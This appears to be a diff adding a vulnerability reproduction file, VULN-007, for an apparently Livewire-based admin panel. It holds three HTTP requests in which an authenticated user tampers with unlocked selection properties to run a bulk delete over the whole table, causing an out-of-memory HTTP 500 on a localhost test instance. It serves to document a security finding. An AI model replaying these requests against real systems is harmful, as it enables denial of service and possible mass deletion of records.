@@ -1,0 +1,29 @@
+### VULN-007 — decisive requests. Full capture in response.txt / run.log.
+### "Select all" is deselection-tracking: 3 public (non-#[Locked]) Livewire props.
+### Empty deselect list ⇒ whereKeyNot([]) ⇒ the whole table; default null chunk ⇒ ->get().
+
+### 1) Snapshot (authenticated panel user)
+GET /admin/posts HTTP/1.1
+Host: localhost:21890
+
+### 2) Mount the delete bulk action with select-all tracking (opens confirm modal)
+POST /livewire/update HTTP/1.1
+Host: localhost:21890
+Content-Type: application/json
+X-Livewire: true
+
+{"_token":"<csrf>","components":[{"snapshot":"<list-posts snapshot>",
+  "updates":{"isTrackingDeselectedTableRecords":true,"deselectedTableRecords":[],"selectedTableRecords":[]},
+  "calls":[{"path":"","method":"mountAction","params":["delete",[],{"table":true,"bulk":true}]}]}]}
+
+### 3) Execute → framework hydrates the ENTIRE table to pass $records → HTTP 500 (OOM)
+POST /livewire/update HTTP/1.1
+Host: localhost:21890
+Content-Type: application/json
+X-Livewire: true
+
+{"_token":"<csrf>","components":[{"snapshot":"<snapshot from step 2>",
+  "updates":{},"calls":[{"path":"","method":"callMountedAction","params":[]}]}]}
+
+### Response to (3): HTTP 500; app log: "Allowed memory size of 536870912 bytes exhausted".
+### Row count is unchanged afterwards → the OOM preceded any delete.
